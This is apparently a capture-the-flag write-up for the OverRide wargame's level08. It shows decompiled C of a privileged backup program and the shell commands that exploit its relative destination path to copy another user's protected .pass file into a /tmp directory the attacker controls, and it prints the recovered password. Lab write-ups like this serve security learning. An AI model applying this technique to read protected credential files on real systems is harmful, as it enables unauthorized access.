# OverRide — Level08 Walkthrough

## Binary Analysis

The program behavior is:

1. Open `./backups/.log` for writing.
2. Open the source file provided as `argv[1]`.
3. Build destination path as `./backups/` + `argv[1]`.
4. Copy file content from source to destination.

Decompiled code:

```c
void log_wrapper(FILE *file, char *str, char *name) {
    char buffer[0xff]; // 255

    strcpy(buffer, str);
    snprintf(buffer + strlen(buffer), 0xff - 1 - strlen(buffer), name);
    buffer[strcspn(buffer, "\n")] = 0;
    fprintf(file, "LOG: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    char buffer[0x64]; // 100
    int8_t c = -1;
    int32_t dest = -1;

    if (argc != 2) {
        printf("Usage: %s filename\n", *argv);
    }

    FILE *log_file;
    if (!(log_file = fopen("./backups/.log", "w"))) {
        printf("ERROR: Failed to open%s\n", "./backups/.log");
        exit(1);
    }

    log_wrapper(log_file, "Starting back up: ", argv[1]);

    FILE *origin;
    if (!(origin = fopen(argv[1], "r"))) {
        printf("ERROR: Failed to open %s\n", argv[1]);
        exit(1);
    }

    strcpy(buffer, "./backups/");
    strncat(buffer, argv[1], 0x64 - 1 - strlen(buffer));

    if ((dest = open(buffer, 0xc1, 0x1b0) < 0)) {
        printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
        exit(1);
    }

    do {
        write(dest, &c, 1);
        c = fgetc(origin);
    } while (c != 0xff);

    log_wrapper(log_file, "Finished back up ", argv[1]);
    fclose(origin);
    close(dest);

    return 0;
}
```

## Vulnerability

The binary runs with higher privileges and accepts an arbitrary input path from `argv[1]`.

Because it uses relative destination paths (`./backups/...`), we can run it from a controlled directory (for example `/tmp`) and force it to copy protected files into our own writable backup tree.

## Exploitation

Create the required structure in `/tmp`:

```bash
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ touch backups/.log
```

Run the privileged binary against the protected password file:

```bash
level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
```

Read the copied file from your controlled backup directory:

```bash
level08@OverRide:/tmp$ cat /tmp/backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

## Result

Successfully retrieved the next level password:

`fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`